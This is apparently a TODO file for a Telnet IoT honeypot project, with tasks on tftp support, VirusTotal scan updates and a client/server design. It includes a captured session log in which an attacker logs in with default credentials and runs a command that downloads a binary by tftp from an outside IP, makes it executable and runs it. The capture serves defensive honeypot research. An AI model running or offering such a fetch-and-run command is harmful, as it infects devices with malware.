# Telnet IoT honeypot TODO

## Small

### clean up html/php frontend
### auto update Malware Scan Results from virustotal (done by virustotal_fill_db.py for now)
### support for tftp

	2016-12-27 19:56:15   main.py:156       New Session
	2016-12-27 19:56:15   main.py:157       Setting timeout to 100.0 seconds
	2016-12-27 19:56:15   main.py:212       TEST 1
	2016-12-27 19:56:15   main.py:235       SEND IAC  - interpret as command
	2016-12-27 19:56:15   main.py:235       SEND DO   - set option
	2016-12-27 19:56:15   main.py:237       SEND 1
	2016-12-27 19:56:16   main.py:247       RECV IAC  - interpret as command
	2016-12-27 19:56:16   main.py:247       RECV WONT - negative return
	2016-12-27 19:56:16   main.py:176       USER Admin
	2016-12-27 19:56:16   main.py:177       PASS 5up
	2016-12-27 19:56:17   main.py:182        # cd /var/tmp;cd /tmp;rm -f *;tftp -l 7up -r 7up -g 89.33.64.118;chmod a+x 7up;./7up
	2016-12-27 19:56:17   main.py:182        # system

## Big

### Client/Server Modell

*Idea*
client (the real honeypot) runs as a telnet server (as now) but all conns and urls are just pushed do a db server, downloading and "analyzing" the binaries.

*PRO*
More servers than one possible (to increase the surface to catch connections)

*CONTRA*
I so not have more than one public IP, so multiple honeypots are useless + Multple IP's can be served via Firewall rules